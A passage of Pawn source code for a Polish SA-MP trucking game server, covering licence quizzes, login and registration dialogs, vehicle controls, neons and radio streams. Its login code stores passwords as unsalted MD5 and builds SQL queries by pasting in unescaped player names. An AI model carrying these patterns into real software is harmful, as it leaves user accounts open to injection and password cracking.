				}
				if(kid == 514)
				{
					if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
					{
						SetPVarInt(playerid, "prawy", 0);
						DestroyObject(PrawyMigacz1[vehicleid]);
						DestroyObject(PrawyMigacz2[vehicleid]);
						DestroyObject(LewyMigacz1[vehicleid]);
						DestroyObject(LewyMigacz2[vehicleid]);
						DestroyObject(NaczepaMigacz1[vehicleid]);
						DestroyObject(NaczepaMigacz2[vehicleid]);
					}
				}
			}
		}

		return 1;
	}
	public OnPlayerEditObject(playerid, playerobject, objectid, response, Float:fX, Float:fY, Float:fZ, Float:fRotX, Float:fRotY, Float:fRotZ) // Thank's For wiki.samp.com :) Very Thanks for KapiziaK
	{
		new Float:oldX, Float:oldY, Float:oldZ,
		Float:oldRotX, Float:oldRotY, Float:oldRotZ;
		GetObjectPos(objectid, oldX, oldY, oldZ);
		GetObjectRot(objectid, oldRotX, oldRotY, oldRotZ);
		if(!playerobject) // If this is a global object, move it for other players
		{
			if(!IsValidObject(objectid)) return;
			MoveObject(objectid, fX, fY, fZ, 10.0, fRotX, fRotY, fRotZ);
		}

		if(response == EDIT_RESPONSE_FINAL)
		{

			new string[300];
			format(string,sizeof string,"# oID:%d - P:%d: %f %f %f %f %f %f", objectid,playerobject,Float:fX, Float:fY, Float:fZ, Float:fRotX, Float:fRotY, Float:fRotZ);
			SendClientMessage(playerid,Zielony,string);

			new File:pos=fopen("positionsGates.pwn", io_append);
			if(pos)
			{

				format(string, 300, "%s = CreateObject(%d,%f,%f,%f,%f,%f,%f);\n",PlayerName(playerid),playerobject, Float:fX, Float:fY, Float:fZ, Float:fRotX, Float:fRotY, Float:fRotZ);
				fwrite(pos, string);
				fclose(pos);
			}

			DestroyObject(objectid);

		}

		if(response == EDIT_RESPONSE_CANCEL)
		{
			//The player cancelled, so put the object back to it's old position
			if(!playerobject) //Object is not a playerobject
			{
				DestroyObject(objectid);
			}
			else
			{
				DestroyObject(objectid);
			}
		}
	}



	public OnPlayerDisconnect(playerid,reason)
	{
		new vehid = GetPlayerVehicleID(playerid);
		if(vehid != 0)
		{
			DestroyObject(kogut[vehid]);
		}
		KillTimer(towarkmtimer[playerid]);
		SetPVarInt(playerid,"misja",0);
		TextDrawHideForPlayer(playerid,pasekuser[playerid]);
		TextDrawHideForPlayer(playerid,useboxuser[playerid]);
		TextDrawSetString(pasekuser[playerid],"Zaloguj sie!!! Panel: pwtruck.pl || Forum: forum.pwtruck.pl");





		SaveUser(playerid);
		new buffer[200];
		format(buffer,sizeof buffer,"UPDATE `users` SET `online` = '0' WHERE `nick` = '%s'",PlayerName(playerid));
		mysql_query(buffer);

		new string[80];

		KillTimer(GetPVarInt(playerid, "Timerek"));

		KillTimer(TimerLogowania[playerid]);

		switch(reason)
		{
			case 0:
			{
				format(string,sizeof string,"# %s opuscil server!(Timed Out/Crash)",PlayerName(playerid),GetPVarInt(playerid,"czasgry"));
				AddLog(PlayerName(playerid),"Wyszedl z servera (Timed Out/Crash)");
			}
			case 1:
			{
				format(string,sizeof string,"# %s opuscil server!(Quit)",PlayerName(playerid),GetPVarInt(playerid,"czasgry"));
				AddLog(PlayerName(playerid),"Wyszedl z servera (Quit)");
			}
			case 2:
			{
				format(string,sizeof string,"# %s opuscil server!(Kick/Ban)",PlayerName(playerid),GetPVarInt(playerid,"czasgry"));
				AddLog(PlayerName(playerid),"Wyszedl z servera (Kick/Ban)");
			}

		}

		SendClientMessageToAll(Szary,string);






		new r,ye,d,h,m,s;
		getdate(r,ye,d);
		gettime(h,m,s);

		new data[100];
		format(data,sizeof data,"%d-%02d-%02d %02d:%02d:%02d",r,ye,d,h,m,s);

		format(buffer,sizeof buffer,"INSERT INTO `chat`(`nick`, `text`, `ingame`, `waiting`,`date`) VALUES ('%s','[INFO] Wyszedl z gry!','1','0','%s')",PlayerName(playerid),data);
		mysql_query(buffer);



		return 1;
	}


	function OnClientCheckResponse(playerid, actionid, memaddr, retndata)
	{
		switch(retndata)
		{
			case 0xA: printf("[AntyCheat] %s posiada niedozwolone modyfikacje!",PlayerName(playerid));
		}
		return true || false; //
	}

	public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
	{

		if(dialogid == PRAWKO_DIALOG)
		{
			if(response == 1)
			{
				if(listitem == 0) // A
				{
					new randpyt = 0;

					if(randpyt != 0) randpyt--;
					SetPVarInt(playerid,"kategoria",1);
					SetPVarInt(playerid,"aktualnepyt",randpyt);
					ShowPlayerDialog(playerid, PRAWKO_DIALOG1, DIALOG_STYLE_INPUT, ">> Pytanie 1/3 <<", PrawkoPytania[randpyt][pyt], "Dalej", "Anuluj");
				}
				if(listitem == 1) // B
				{ 
					new randpyt = 0;

					if(randpyt != 0) randpyt--;
					SetPVarInt(playerid,"kategoria",2);
					SetPVarInt(playerid,"aktualnepyt",randpyt);
					ShowPlayerDialog(playerid, PRAWKO_DIALOG1, DIALOG_STYLE_INPUT, ">> Pytanie 1/3 <<", PrawkoPytania[randpyt][pyt], "Dalej", "Anuluj");
				}
				if(listitem == 2) // C
				{
					new randpyt = 0;

					if(randpyt != 0) randpyt--;
					SetPVarInt(playerid,"kategoria",3);
					SetPVarInt(playerid,"aktualnepyt",randpyt);
					ShowPlayerDialog(playerid, PRAWKO_DIALOG1, DIALOG_STYLE_INPUT, ">> Pytanie 1/3 <<", PrawkoPytania[randpyt][pyt], "Dalej", "Anuluj");
				}
				if(listitem == 3) // D
				{
					new randpyt = 0;

					if(randpyt != 0) randpyt--;
					SetPVarInt(playerid,"kategoria",4);
					SetPVarInt(playerid,"aktualnepyt",randpyt);
					ShowPlayerDialog(playerid, PRAWKO_DIALOG1, DIALOG_STYLE_INPUT, ">> Pytanie 1/3 <<", PrawkoPytania[randpyt][pyt], "Dalej", "Anuluj");
				}

				if(GetPVarInt(playerid,"kategoria") == 1) GiveMoneyEx(playerid,-2000);
				if(GetPVarInt(playerid,"kategoria") == 2) GiveMoneyEx(playerid,-2500);
				if(GetPVarInt(playerid,"kategoria") == 3) GiveMoneyEx(playerid,-3000);
				if(GetPVarInt(playerid,"kategoria") == 4) GiveMoneyEx(playerid,-2700);

				// "Kategoria: A >> $2000\nKategoria: B >> $2500\nKategoria: C >> $3000\nKategoria: D >> $2700

			}
		}
		if(dialogid == PRAWKO_DIALOG1)
		{
			if(response == 1)
			{
				//inputtext[0] = tolower(inputtext[0]);

				if(!strcmp(inputtext,PrawkoPytania[GetPVarInt(playerid,"aktualnepyt")][odp],true))
				{
					if(PRAWKO_DOZ)
					{

					dance:
					new randpyt = 1;
					
					if(GetPVarInt(playerid,"aktualnepyt") == randpyt)
					goto dance;
					SetPVarInt(playerid,"aktualnepyt",randpyt);
					SendClientMessage(playerid, Zielony, "# Twoja odpowiedz jest prawidlowa!");
					ShowPlayerDialog(playerid, PRAWKO_DIALOG2, DIALOG_STYLE_INPUT, ">> Pytanie 2/3 <<", PrawkoPytania[randpyt][pyt], "Dalej", "Anuluj");
					}
				}
				else
				{
					SendClientMessage(playerid, Szary, "# Zle! Nie zdales/as testu na prawo jazdy!");
				}
			}
		}
		if(dialogid == PRAWKO_DIALOG2)
		{
			if(response == 1)
			{


				if(!strcmp(inputtext,PrawkoPytania[GetPVarInt(playerid,"aktualnepyt")][odp],true))
				{
					if(PRAWKO_DOZ)
					{
					new randpyt = 2;
					SetPVarInt(playerid,"aktualnepyt",2);
					SendClientMessage(playerid, Zielony, "# Twoja odpowiedz jest prawidlowa!");
					ShowPlayerDialog(playerid, PRAWKO_DIALOG3, DIALOG_STYLE_INPUT, ">> Pytanie 3/3 <<", PrawkoPytania[randpyt][pyt], "Dalej", "Anuluj");
					}
				}
				else
				{
					SendClientMessage(playerid, Szary, "# Zle! Nie zdales/as testu na prawo jazdy!");
				}
			}
		}
		if(dialogid == PRAWKO_DIALOG3)
		{
			if(response == 1)
			{
				if(PRAWKO_DOZ)
				{

				if(!strcmp(inputtext,PrawkoPytania[GetPVarInt(playerid,"aktualnepyt")][odp],true))
				{
					//new randpyt = 2;
					SetPVarInt(playerid,"aktualnepyt",2);
					SendClientMessage(playerid, Zielony, "# Twoja odpowiedz jest prawidlowa!");
					ShowPlayerDialog(playerid, 6906, DIALOG_STYLE_MSGBOX, ">> Koniec <<", ""ZIELONYHEX"Gratulacje! Zdales test na wynik: "BIALYHEX"POZYTYWNY\n"ZIELONYHEX"Prawo jazdy jest wazne 14 dni po zdaniu testu!\nPo wygasnieciu nalezy je znowu aktywowac!", "Zakoncz", "");
					new string[150];
					format(string,sizeof string,"# "BIALYHEX"%s "INFOHEX"zdal egzamin na prawo jazdy z wynikiem pozytywnym! Gratulujemy!",PlayerName(playerid));
					SendClientMessageToAll(COLOR_INFOS, string);
					new kategoria = GetPVarInt(playerid,"kategoria");
					// "Kategoria: A >> $2000\nKategoria: B >> $2500\nKategoria: C >> $3000\nKategoria: D >> $2700
					if(kategoria == 1)
					{
						new query[200];
						format(query,sizeof query,"UPDATE `users` SET `PrawkoA` = '1', `PrawkoAto` = DATE_ADD(NOW() , INTERVAL 14 DAY) WHERE `id` = '%d'",PlayerInfo[playerid][UID]);
						mysql_query(query);
						PlayerInfo[playerid][PrawkoA] = true;
					}	
					if(kategoria == 2)
					{
						new query[200];
						format(query,sizeof query,"UPDATE `users` SET `PrawkoB` = '1', `PrawkoBto` = DATE_ADD(NOW() , INTERVAL 14 DAY) WHERE `id` = '%d'",PlayerInfo[playerid][UID]);
						mysql_query(query);
						PlayerInfo[playerid][PrawkoB] = true;
					}	
					if(kategoria == 3)
					{
						new query[200];
						format(query,sizeof query,"UPDATE `users` SET `PrawkoC` = '1', `PrawkoCto` = DATE_ADD(NOW() , INTERVAL 14 DAY) WHERE `id` = '%d'",PlayerInfo[playerid][UID]);
						mysql_query(query);
						PlayerInfo[playerid][PrawkoC] = true;
					}	
					if(kategoria == 4)
					{
						new query[200];
						format(query,sizeof query,"UPDATE `users` SET `PrawkoD` = '1', `PrawkoDto` = DATE_ADD(NOW() , INTERVAL 14 DAY) WHERE `id` = '%d'",PlayerInfo[playerid][UID]);
						mysql_query(query);
						PlayerInfo[playerid][PrawkoD] = true;
					}	
				}
				else
				{
					SendClientMessage(playerid, Szary, "# Zle! Nie zdales/as testu na prawo jazdy!");
				}
				}
			}
		}


		if(dialogid == DIALOG_POJAZD)
		{
			if(response == 1)
			{
				new vehid = GetPlayerVehicleID(playerid);
				if(vehid != 0)
				{
					new engine,lights,alarm,doors,bonnet,boot,objective;
					if(GetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, doors, bonnet, boot, objective))
					{
						GetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, doors, bonnet, boot, objective);
						switch (listitem)
						{
							case 0:
							{
								if(engine == 1) SetVehicleParamsEx(GetPlayerVehicleID(playerid), 0, lights, alarm, doors, bonnet, boot, objective);
								else 			SetVehicleParamsEx(GetPlayerVehicleID(playerid), 1, lights, alarm, doors, bonnet, boot, objective);
							}
							case 1:
							{
								if(lights == 1) SetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, 0, alarm, doors, bonnet, boot, objective);
								else 		    SetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, 1, alarm, doors, bonnet, boot, objective);								
							}
							//case 2:
							//{
							//	if(doors == 1) SetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, 0, bonnet, boot, objective);
							//	else 		   SetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, 1, bonnet, boot, objective);								
							//}
						}
						GetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, doors, bonnet, boot, objective);
						new stringp[150];
							
						if(engine == 1) strcat(stringp, ""CZERWONYHEX"Wylacz silnik 			[ON]\n");
						else 			strcat(stringp, ""BIALYHEX"Wlacz Silnik 			[OFF]\n");

						if(lights == 1) strcat(stringp, ""CZERWONYHEX"Wylacz Lampy 			[ON]\n");
						else 			strcat(stringp, ""BIALYHEX"Wlacz Lampy 			[OFF]\n");

						//if(doors == 1)  strcat(stringp, ""BIALYHEX"Odblokuj drzwi 			[CLOSED]");
						//else 			strcat(stringp, ""CZERWONYHEX"Zablokuj drzwi 			[OPENED]");

						if(engine == 1)
						{
							TextDrawSetString(silniktd[playerid],"~r~Silnik: ~w~ON");
						}
						else
						{
							TextDrawSetString(silniktd[playerid],"~r~Silnik: ~w~OFF");
						}




						ShowPlayerDialog(playerid, DIALOG_POJAZD, DIALOG_STYLE_LIST, ">> Panel Pojazdu <<", stringp, "Wybierz", "Anuluj");	
					}

				}

			}
		}

		if(dialogid == Logowanie)
		{
			if(response == 0)
			{
				KickExServer(playerid,"Logowanie");
			}
			if(response == 1)
			{
				if(strlen(inputtext) <= 3)
				{
					KickExServer(playerid,"Haslo musi byc dluzsze niz 3 znaki!");
				}
				else
				{

					new query[150];
					format(query,sizeof query,"SELECT * FROM `users` WHERE `nick` = '%s' AND `password` = '%s' ",PlayerName(playerid),MD5_Hash(inputtext));
					mysql_query(query);
					mysql_store_result();
					if(mysql_num_rows() != 0)
					{
						SendClientMessage(playerid, Zielony, "# Zalogowales sie pomyslnie.");
						LoadUser(playerid);
					}
					else
					{
						KickExServer(playerid,"Zle haslo!");
					}
				}
			}
		}
		if(dialogid == Rejestracja)
		{
			if(response == 0)
			{
				KickExServer(playerid,"Rejestracja");
			}
			if(response == 1)
			{
				if(strlen(inputtext) <= 3)
				{
					KickExServer(playerid,"Haslo musi byc dluzsze niz 3 znaki!");
				}
				else
				{

					new pIP[16];
					GetPlayerIp(playerid,pIP,sizeof pIP);


					new buffer[500];
					format(buffer,sizeof buffer,"INSERT INTO `users` (`nick`, `password`, `score`, `money`, `ip`, `host`, `team`, `vip`, `vipto`) VALUES ('%s', '%s','0','0','%s','%s','0','0','0000-00-00')",PlayerName(playerid),MD5_Hash(inputtext),pIP,PlayerHost[playerid]);
					mysql_query(buffer);
					SendClientMessage(playerid, Zielony, "# Twoje konto zostalo zarejestrowane w naszej bazie! Mozesz od tej chwili korzystac z panelu gracza!");
					LoadUser(playerid);
				}
			}
		}

		if(dialogid == Radio)
		{
			if(response == 0)
			{
				SendClientMessage(playerid,Zielony,"# Anulowales wybieranie radia!");
			}
			if(response == 1)
			{
				if(listitem == 0)
				{
					SendClientMessage(playerid,Zielony,"# Wlaczyles radio: "BIALYHEX"Eska!");
					PlayAudioStreamForPlayer(playerid, "http://poznan5-5.radio.pionier.net.pl:8000/eska-warszawa.mp3.m3u");

				}
				if(listitem == 1)
				{
					SendClientMessage(playerid,Zielony,"# Wlaczyles radio: "BIALYHEX"Radio Zet!");
					PlayAudioStreamForPlayer(playerid, "http://radiozetmp3-01.eurozet.pl:8400");
				}
				if(listitem == 2)
				{
					SendClientMessage(playerid,Zielony,"# Wlaczyles radio: "BIALYHEX"RMF FM");
					PlayAudioStreamForPlayer(playerid, "http://files.kusmierz.be/rmf/rmffm.pls");
				}
				if(listitem == 3)
				{
					SendClientMessage(playerid,Zielony,"# Wlaczyles radio: "BIALYHEX"Radio Party");
					PlayAudioStreamForPlayer(playerid, "http://polskastacja.pl/play/party.pls");
				}
				if(listitem == 4)
				{
					SendClientMessage(playerid,Zielony,"# Wlaczyles radio: "BIALYHEX"Rmf Maxxx");
					PlayAudioStreamForPlayer(playerid, "http://files.kusmierz.be/rmf/rmfmaxxx.pls");
				}
			}
		}
		if(dialogid == Menu)
		{
			if(response == 0)
			{
				SendClientMessage(playerid,Zielony,"# Anulowales menu!");
			}
			if(response == 1)
			{

				if(listitem == 0)
				{
					ShowPlayerDialog(playerid, Telefon, DIALOG_STYLE_LIST, "Telefon", "Policja\nPomoc Drogowa\nPogotowie\nTaxi", "Wybierz", "Anuluj");
				}
				if(listitem == 1)
				{
					new string[150];
					format(string,sizeof string,"UID: %d\nScore: %d\nPieniadze: $%d\nLegalne: %d\nNieLegalne: %d\nVIP: %d\nTeam: %d\nPoziom: %d",PlayerInfo[playerid][UID],GetScoreEx(playerid),GetMoneyEx(playerid),PlayerInfo[playerid][Legalne],PlayerInfo[playerid][Nielegalne],PlayerInfo[playerid][VIP],PlayerInfo[playerid][Team],PlayerInfo[playerid][Poziom]);
					ShowPlayerDialog(playerid, 1348, DIALOG_STYLE_MSGBOX, PlayerName(playerid), string, "Wyjdz", #);

				}
				if(listitem == 2)
				{
					ShowPlayerDialog(playerid, PojazdOpcje, DIALOG_STYLE_LIST, "Pojazd", "Zapisz Pozycje Pojazdu\nZamontuj Neon\nUsun neon", "Wybierz", "Anuluj");
				}
				if(listitem == 3)
				{
					ShowPlayerDialog(playerid, Eventy, DIALOG_STYLE_LIST, "Eventy Graczy", "Tankuj pojazdy\nKup Kamizelke", "Wybierz", "Anuluj");

				}

			}
		}

		if(dialogid == PojazdOpcje)
		{
			if(response == 0)
			{
				SendClientMessage(playerid,Zielony,"# Anulowales opcje pojazdu!");
			}
			if(response == 1)
			{

				if(listitem == 0)
				{
					new vehicleidd[MAX_PLAYERS];
					vehicleidd[playerid] = GetPlayerVehicleID(playerid);


					if(!strcmp(VehicleInfo[vehicleidd[playerid]][Owner],"Brak",false))
					{
						if(PlayerInfo[playerid][LevelAdmin] <= 1)
							return BrakAdmina(playerid,2);
					}



					if(strcmp(VehicleInfo[vehicleidd[playerid]][Owner],"Brak",false))
					{
						if(!strcmp(VehicleInfo[vehicleidd[playerid]][Owner],Player(playerid),false) || PlayerInfo[playerid][LevelAdmin] >= 2)
						{



							if(vehicleidd[playerid] != 0)
							{
								new buffer[300];
								new Float:xp;
								new Float:yp;
								new Float:zp;
								new Float:ap;
								GetVehiclePos(vehicleidd[playerid],xp,yp,zp);
								GetVehicleZAngle(vehicleidd[playerid],ap);
								format(buffer,sizeof buffer,"UPDATE `vehicles` SET `x`='%f',`y`='%f',`z`='%f',`a`='%f' WHERE id='%d'",xp,yp,zp,ap,VehicleInfo[vehicleidd[playerid]][UID]);
								mysql_query(buffer);
								printf("[ADMIN LOG] %s ustawil wartosc POZYCJA u auta %d na : %f %f %f %f",Player(playerid),VehicleInfo[vehicleidd[playerid]][UID],xp,yp,zp,ap);
								SendClientMessage(playerid,Zielony,"Wartosc tego auta POZYCJA zostala poprawnie zmieniona!");
								DestroyVehicle(vehicleidd[playerid]);
								vehicleidd[playerid] = AddStaticVehicleEx(VehicleInfo[vehicleidd[playerid]][Model],xp,yp,zp,ap,VehicleInfo[vehicleidd[playerid]][Color1],VehicleInfo[vehicleidd[playerid]][Color2], 60*10000);
								SetVehicleNumberPlate(vehicleidd[playerid], VehicleInfo[vehicleidd[playerid]][Owner]);
								SetVehicleToRespawn(vehicleidd[playerid]);
								SetPlayerPos(playerid,xp,yp+3,zp);
							}
						}
						else
						{
							SendClientMessage(playerid,Czerwony,"# Nie masz kluczykow do tego auta!");
						}
					}
					else if(!strcmp(VehicleInfo[vehicleidd[playerid]][Owner],"Brak",false))
					{


						if(vehicleidd[playerid] != 0)
						{
							new buffer[300];
							new Float:xp;
							new Float:yp;
							new Float:zp;
							new Float:ap;
							GetVehiclePos(vehicleidd[playerid],xp,yp,zp);
							GetVehicleZAngle(vehicleidd[playerid],ap);
							format(buffer,sizeof buffer,"UPDATE `vehicles` SET `x`='%f',`y`='%f',`z`='%f',`a`='%f' WHERE id='%d'",xp,yp,zp,ap,VehicleInfo[vehicleidd[playerid]][UID]);
							mysql_query(buffer);
							printf("[ADMIN LOG] %s ustawil wartosc POZYCJA u auta %d na : %f %f %f %f",Player(playerid),VehicleInfo[vehicleidd[playerid]][UID],xp,yp,zp,ap);
							SendClientMessage(playerid,Zielony,"Wartosc tego auta POZYCJA zostala poprawnie zmieniona!");
							DestroyVehicle(vehicleidd[playerid]);
							vehicleidd[playerid] = AddStaticVehicleEx(VehicleInfo[vehicleidd[playerid]][Model],xp,yp,zp,ap,VehicleInfo[vehicleidd[playerid]][Color1],VehicleInfo[vehicleidd[playerid]][Color2], 60*10000);
							SetVehicleNumberPlate(vehicleidd[playerid], VehicleInfo[vehicleidd[playerid]][Owner]);
							SetVehicleToRespawn(vehicleidd[playerid]);
							SetPlayerPos(playerid,xp,yp+3,zp);
						}
					}
				}
				if(listitem == 1)
				{
					if(PlayerInfo[playerid][VIP] != 1)
						return SendClientMessage(playerid,Zielony,"# Potrzebujesz konta VIP do koguta!");

					{
						ShowPlayerDialog(playerid, NEONY, DIALOG_STYLE_LIST, "KOLOR NEONOW", ">> Czerowny\n>> Siwy\n>> Zielony\n>> Zolty\n>> Rozowy\n>> Bialy", "Zamontuj", "<< Cofnij");
					}


				}
			}
		}
		if(dialogid == NEONY)
		{
			if(response == 0)
			{
				ShowPlayerDialog(playerid, PojazdOpcje, DIALOG_STYLE_LIST, "OPCJE POJAZDO", ">> Zamontuj Neon\n>> Zmien Kolor\n>> Tuninguj Pojazd\n>> Usun neon", "Wybierz", "Anuluj");
			}
			if(response == 1)
			{
				if(listitem == 0)
				{
					if(!IsPlayerInAnyVehicle(playerid))
					{
						SendClientMessage(playerid, Szary, "Nie siedzisz w pojezdzie");
						return 1;
					}
					DestroyObject(neon[GetPlayerVehicleID(playerid)][0]);
					DestroyObject(neon[GetPlayerVehicleID(playerid)][1]);
					neon[GetPlayerVehicleID(playerid)][0] = CreateObject(18647,0,0,0,0,0,0,100.0);
					neon[GetPlayerVehicleID(playerid)][1] = CreateObject(18647,0,0,0,0,0,0,100.0);
					AttachObjectToVehicle(neon[GetPlayerVehicleID(playerid)][0], GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
					AttachObjectToVehicle(neon[GetPlayerVehicleID(playerid)][1], GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
				}
				if(listitem == 1)
				{
					if(!IsPlayerInAnyVehicle(playerid))
					{
						SendClientMessage(playerid, Szary, "Nie siedzisz w pojezdzie");
						return 1;
					}
					DestroyObject(neon[GetPlayerVehicleID(playerid)][0]);
					DestroyObject(neon[GetPlayerVehicleID(playerid)][1]);
					neon[GetPlayerVehicleID(playerid)][0] = CreateObject(18648,0,0,0,0,0,0,100.0);
					neon[GetPlayerVehicleID(playerid)][1] = CreateObject(18648,0,0,0,0,0,0,100.0);
					AttachObjectToVehicle(neon[GetPlayerVehicleID(playerid)][0], GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
					AttachObjectToVehicle(neon[GetPlayerVehicleID(playerid)][1], GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
				}
				if(listitem == 2)
				{
					if(!IsPlayerInAnyVehicle(playerid))
					{
						SendClientMessage(playerid, Szary, "Nie siedzisz w pojezdzie");
						return 1;
					}
					DestroyObject(neon[GetPlayerVehicleID(playerid)][0]);
					DestroyObject(neon[GetPlayerVehicleID(playerid)][1]);
					neon[GetPlayerVehicleID(playerid)][0] = CreateObject(18649,0,0,0,0,0,0,100.0);
					neon[GetPlayerVehicleID(playerid)][1] = CreateObject(18649,0,0,0,0,0,0,100.0);
					AttachObjectToVehicle(neon[GetPlayerVehicleID(playerid)][0], GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
					AttachObjectToVehicle(neon[GetPlayerVehicleID(playerid)][1], GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
				}
				if(listitem == 3)
				{
					if(!IsPlayerInAnyVehicle(playerid))
					{
						SendClientMessage(playerid, Szary, "Nie siedzisz w pojezdzie");
						return 1;
					}
					DestroyObject(neon[GetPlayerVehicleID(playerid)][0]); // Copyright (c) 2014-2015 KapiziaK
					DestroyObject(neon[GetPlayerVehicleID(playerid)][1]);
					neon[GetPlayerVehicleID(playerid)][0] = CreateObject(18650,0,0,0,0,0,0,100.0);
					neon[GetPlayerVehicleID(playerid)][1] = CreateObject(18650,0,0,0,0,0,0,100.0);
					AttachObjectToVehicle(neon[GetPlayerVehicleID(playerid)][0], GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
					AttachObjectToVehicle(neon[GetPlayerVehicleID(playerid)][1], GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
				}
				if(listitem == 4)
				{
					if(!IsPlayerInAnyVehicle(playerid))
					{
						SendClientMessage(playerid, Szary, "Nie siedzisz w pojezdzie");
						return 1;
					}
					DestroyObject(neon[GetPlayerVehicleID(playerid)][0]);
					DestroyObject(neon[GetPlayerVehicleID(playerid)][1]);
					neon[GetPlayerVehicleID(playerid)][0] = CreateObject(18651,0,0,0,0,0,0,100.0);
					neon[GetPlayerVehicleID(playerid)][1] = CreateObject(18651,0,0,0,0,0,0,100.0);
					AttachObjectToVehicle(neon[GetPlayerVehicleID(playerid)][0], GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
					AttachObjectToVehicle(neon[GetPlayerVehicleID(playerid)][1], GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
				}
				if(listitem == 5)
				{
					if(!IsPlayerInAnyVehicle(playerid))
					{
						SendClientMessage(playerid, Szary, "Nie siedzisz w pojezdzie");
						return 1;
					}
					DestroyObject(neon[GetPlayerVehicleID(playerid)][0]);
					DestroyObject(neon[GetPlayerVehicleID(playerid)][1]);
					neon[GetPlayerVehicleID(playerid)][0] = CreateObject(18652,0,0,0,0,0,0,100.0);
					neon[GetPlayerVehicleID(playerid)][1] = CreateObject(18652,0,0,0,0,0,0,100.0);
					AttachObjectToVehicle(neon[GetPlayerVehicleID(playerid)][0], GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
					AttachObjectToVehicle(neon[GetPlayerVehicleID(playerid)][1], GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
				}
				if(listitem == 6)
				{
					if(!IsPlayerInAnyVehicle(playerid))
					{
						SendClientMessage(playerid, Szary, "Nie siedzisz w pojezdzie");
						return 1;
					}
					DestroyObject(neon[GetPlayerVehicleID(playerid)][0]);
					DestroyObject(neon[GetPlayerVehicleID(playerid)][1]);
				}
			}
		}
		if(dialogid == Eventy)
		{
			if(response == 1)
			{
				if(listitem == 0)
				{

					if(GetMoneyEx(playerid) > 5000)
					{
						for(new i=0; i <= LoadedInfo[Vehicles]; i++)
						{
							VehicleInfo[i][Paliwo] = 350;
						}
						new string[256];
						format(string, sizeof(string), "Gracz {FFFFFF}%s {0000FF}zatankowal wszystkie pojazdy. Dziekujemy!", PlayerName(playerid));
						SendClientMessageToAll(Zielony,string);
						GiveMoneyEx(playerid,-5000);
					}
					else
					{
						SendClientMessage(playerid, Szary, "Nie stac cie na zatankowanie pojazdow.");
					}
				}
			}
			if(listitem == 1)
			{
				if(GetMoneyEx(playerid) > 100) {
					SetPlayerArmour(playerid, 100);
					GiveMoneyEx(playerid,-100);
					SendClientMessage(playerid, Zielony ,"KupiÂ³eÅ“ KamizelkÃª za 100$!");
				}
				else
				{
					SendClientMessage(playerid, Czerwony, "Nie masz tyle pieniedzy!");
				}
			}
		}
		if(dialogid == Pomoc)
		{
			if(response == 1)
			{
				if(listitem == 0)
				{
					new ocochodzi[2500];
					new ococho[256];
					strcat(ocochodzi, "{FFFFFF}Witaj drogi truckerze!\nDzis wyjasnie ci oco chodzi , co sie robi w naszym serverze!\nWiec, narpiew bierzesz tira naciskasz Y i naczepe i podjezdzasz pod napis zaladunku(pisze nazwa magazynu i wpisz zaladunek) \nnalezy wpisac /zaladuj\nGdy juz zaladujesz towar wyswietli ci sie pod licznikiem nazwa towaru i km.\nTen dystans zalezy od twojego wynagrodzenia po rozladunku!\nGdy juz nabijesz dowolna ilosc km , jedziesz do magazynu i wpisujesz /rozladuj.\n\n");
					format(ococho, sizeof(ococho), "{FFFFFF}Wiec {3A802F}%s {FFFFFF}bierz ciezarowke i w droge!", PlayerName(playerid));
					strcat(ocochodzi, ococho);
					ShowPlayerDialog(playerid, OcoChodzi, DIALOG_STYLE_MSGBOX, "O Co Chodzi?", ocochodzi, "<< Cofnij", "Wyjdz");
				}
				if(listitem == 1)
				{
					new praktyka[3000];
					strcat(praktyka, "{3A802F}1. {FFFFFF}Znajdz ciezarowke i wejdz do niej, silnik uruchomisz za pomoca przyciskow: {3A802F}NUM2\n{3A802F}2. {FFFFFF}Poszukaj naczepy i podjedz pod nia, aby ja podczepic pod swoj pojazd.\n{3A802F}3. {FFFFFF}Udaj sie do magazynu oznaczonym na mapie szara ciezarowko, wjedz w pickup i wpisz: {3A802F}/zaladuj{FFFFFF}.\n{3A802F}4. {FFFFFF}Wybierz towar, pamietaj, ze za towary nielegalne grozi grzywna lub wiezienie.\n");
					strcat(praktyka, "{3A802F}5. {FFFFFF}Status swojego towaru mozesz sprawdzic wpisujac komende: {3A802F}/dokumenty{FFFFFF}.\n{3A802F}6. {FFFFFF}Gdy zaladujesz towar jedz do innego magazynu, gdy dotrzesz na miejsce wpisz: {3A802F}/rozladuj{FFFFFF}.\n\n{FFFFFF}W taki sposob wykonales pierwszy kurs.\n{FFFFFF}Zyczymy milej i przyjemnej gry. Zapraszamy na strone {3A802F}www.pwtruck.pl\n");
					ShowPlayerDialog(playerid, Praktyka, DIALOG_STYLE_MSGBOX, "Praktyka - Czyli Jak Grac", praktyka, "<< Cofnij", "Wyjdz");
				}
				if(listitem == 2)
				{
					new komendy[3000];
